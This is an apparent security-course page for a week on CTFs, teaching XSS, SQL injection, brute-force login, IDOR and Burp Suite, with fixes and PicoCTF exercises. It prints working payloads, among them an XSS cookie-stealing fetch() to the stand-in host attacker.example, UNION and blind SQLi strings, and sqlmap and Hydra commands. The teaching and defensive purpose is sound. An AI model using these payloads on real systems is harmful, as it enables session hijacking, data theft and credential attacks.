---
layout: page
title: "CTF Introduction: Your First Flags"
week_number: "17"
release_date: "2026-08-11"
phase_label: "Phase 4"
phase_name: "CTF & HackTheBox"
phase_color: "#e63946"
permalink: /week-17/
---

> Week 17. CTF -- Capture the Flag.
> 
> A CTF is a security competition where you solve puzzles to find hidden strings called flags (usually in the format CTF{some_text_here}). Each solved challenge gives you points.
> 
> CTFs are how security professionals learn. They cover: web hacking, cryptography, reverse engineering, forensics, binary exploitation, and OSINT.
> 
> This week you create your accounts and solve your first real CTF challenges.
> 
> Step 1: Create an account at https://picoctf.org (free, beginner-friendly)
> Step 2: Create an account at https://app.hackthebox.com (free tier available)
> Step 3: For this week, stay on PicoCTF -- it is designed for beginners

---

# Web Exploitation Techniques

**Pillar:** Cybersecurity
**Level:** Intermediate
**Read time:** 20 minutes
**Prerequisite:** `beginner/02_owasp-top10.md`

## Scope

Practical exploitation of the most common web vulnerabilities in controlled lab environments. All examples are for isolated test apps only. See `ETHICS.md`.

---

## Cross-Site Scripting (XSS)

XSS injects JavaScript into a page served to another user's browser. The script runs with the victim's session.

### Three types

| Type | How it persists | Example |
|------|----------------|---------|
| Reflected | Does not persist; victim must click a crafted link | Search result page echoing the query |
| Stored | Saved in the database; runs for every visitor | Blog comment with `<script>` in it |
| DOM-based | Never hits the server; triggered by client-side JS reading `location.hash` | Single-page app reading URL fragment |

### Basic payloads (lab only)

```html
<!-- Confirm execution -->
<script>alert(document.domain)</script>

<!-- Cookie theft (requires no HttpOnly flag) -->
<script>fetch('https://attacker.example/c?d='+document.cookie)</script>

<!-- Bypass simple filters -->
<img src=x onerror="alert(1)">
<svg onload="alert(1)">
```

### Fix

```python
# Never do this
return f"<p>Hello {username}</p>"

# Do this (Jinja2 auto-escapes by default)
return render_template("hello.html", username=username)

# Also set Content Security Policy header
response.headers["Content-Security-Policy"] = "default-src 'self'"
```

---

## SQL Injection (SQLi)

SQL injection passes attacker-controlled input to a database query, altering its logic.

### Detection

Try these inputs in any field that might query a database:
```
'
''
' OR '1'='1
' OR 1=1--
```

If the app behaves differently (error, different data, longer response), it may be injectable.

### In-band extraction

```sql
-- UNION-based: requires knowing column count
' UNION SELECT null, username, password FROM users--

-- Error-based: extract data through error messages
' AND extractvalue(1, concat(0x7e, (SELECT version())))--
```

### Blind SQLi

When there is no visible output, infer data from true/false responses:

```sql
-- Does the first character of the admin password equal 'a'?
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
```

### Fix

```python
# Vulnerable
cursor.execute(f"SELECT * FROM users WHERE name = '{name}'")

# Parameterised (safe)
cursor.execute("SELECT * FROM users WHERE name = %s", (name,))

# ORM (also safe, handles parameterisation)
User.query.filter_by(name=name).first()
```

### SQLmap (lab use only)

```bash
sqlmap -u "http://localhost:5000/user?id=1" --dbs --batch
```

---

## Broken Authentication

Exploiting weak session management or login controls.

### Session hijacking

If a session token is in a cookie without `HttpOnly`, XSS can steal it:
```javascript
document.cookie  // returns "session=eyJhbGci..."
```

Replay the stolen cookie in Burp Suite to hijack the session.

### Brute force login

```bash
# Hydra against a form POST
hydra -L users.txt -P rockyou.txt http-post-form \
  "localhost:5000/login:username=^USER^&password=^PASS^:Invalid credentials" -t 4
```

**What to defend:** Rate limit (5 attempts, then lockout + CAPTCHA). MFA. Account lockout alerts.

---

## Insecure Direct Object Reference (IDOR)

Changing an ID in a URL or API call to access another user's data.

```
GET /api/orders/1001   -> your order
GET /api/orders/1002   -> someone else's order (returns 200 instead of 403)
```

**Detection:** Change numeric IDs, UUIDs, and usernames in any request. Use Burp Suite to intercept and modify.

**Fix:** Always check `order.user_id == current_user.id` server-side before returning data.

---

## Using Burp Suite for Manual Testing

1. Open Burp Suite, go to Proxy > Intercept > Open Browser
2. Browse to your target app; Burp captures all requests
3. Right-click any request: "Send to Repeater" to replay with modifications
4. Right-click any parameter: "Send to Intruder" for automated fuzzing

Key views:
- **Repeater**: manually modify and replay single requests
- **Intruder**: automate parameter fuzzing with a wordlist
- **Decoder**: base64/URL encode and decode payloads
- **Logger**: full history of every request made

## Checklist

- [ ] Successfully trigger a stored XSS in the `activities/cybersecurity/medium/01_xss-demo.md` lab
- [ ] Extract data from a vulnerable query using UNION-based SQLi in the SQLi playground lab
- [ ] Intercept and modify a request in Burp Suite Repeater
- [ ] Identify an IDOR in any lab app by changing a numeric ID in the URL

## Next Steps

- Lab: `activities/cybersecurity/medium/01_xss-demo.md`
- Lab: `activities/cybersecurity/medium/03_sqli-playground.md`
- Guide: `advanced/01_pentesting-methodology.md`

---

## Activity: PicoCTF: Solve 5 Challenges

1. Log into https://picoctf.org and go to the Practice section
1. Solve at least 5 challenges. Required: at least 1 from 'Web Exploitation', at least 1 from 'Cryptography', at least 1 from 'General Skills'
1. For each challenge you solve, write a short write-up: what was the challenge, what approach did you try, what worked, what was the flag
1. If you get stuck on a challenge for more than 30 minutes, look at the hint, then try again before looking at write-ups
1. Save your write-ups in a file called week17-ctf-notes.txt
1. You know you are done when you have 5 flags and 5 write-ups

---

## Check-in Questions

Write your answers down before your next session.

1. What does the flag format CTF{...} tell you and why do CTFs use a consistent format?
2. Describe one challenge you solved: what was the vulnerability or puzzle, and how did you find the flag?
3. What is the difference between a black-box and white-box CTF challenge?
4. What tool or technique from a previous week did you use in a CTF challenge this week?
